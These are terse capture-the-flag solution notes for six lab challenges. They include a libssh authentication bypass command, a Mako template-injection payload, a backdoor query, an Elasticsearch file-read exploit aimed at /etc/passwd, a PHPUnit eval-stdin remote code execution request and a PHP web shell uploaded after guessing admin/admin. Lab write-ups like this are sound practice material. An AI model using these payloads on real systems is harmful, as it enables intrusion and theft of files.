# CyberSecurity


libssh
Flag format: CTF{sha256}
Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
libssh is a C library that enables you to write a program that uses the SSH protocol. With it, you can remotely execute programs, transfer files, or use a secure and transparent tunnel for your remote programs.
using Nmap to scan the port 
nmap –sV –sC –p port ip -Pn
after scanning we can use CVE-2018-10993 libSSH authentication bypass exploit
cve-2018-10993.py ip -p port -31367 -c "cd ..;cat flag.txt"
ctf
shark
Flag format: CTF{sha256}
Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
curl is a command-line tool for getting or sending data including files using URL syntaxi
using curl we can find out that the website is uisng Werkzeug web application library
we can use Server-Side Template Injection and send MAKO payload using burp suite
name=<%
<%
import os
x=os.popen('cat flag').read()
%>
${x}
ctf
nodiff-backdoor
Flag format: CTF{sha256}
Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
dirsearch is An advanced command-line tool designed to brute force directories and files in webservers
using dirsearch dirsearch -u ip we can see backup.zip file
using wget command we can dowload //backup.zip
if we search this file, we can find functions with vulnerabilities,
after finding vulnerability we can use the backdoor to get the flag by using /?welldone=knockknock&shazam=id
ctf
elastic
there is a vulnerabilty we can find using searchsploit elasticsearch 
CVE-2015-5531- Arbitrary file Vulnerability. 
https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
exploit.py ip /etc/passwd
php-unit
using dirsearch we can find vulnerable files dirsearch.py -u ip -w ./db/dicc.txt
phpunit/phpunit: 5.6.2 has vulnerabilty
using burp send request to /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
using command we can retrieve the flag <?php system('cat /flag.txt')?>
bolt
/bolt/login
guess password admin admin
we can upload file but to run php command it has to be uploaded using another format
access cmd with <?php echo system($_GET['cmd']);?> command
cmd=cat%20/flag.txt
flag

























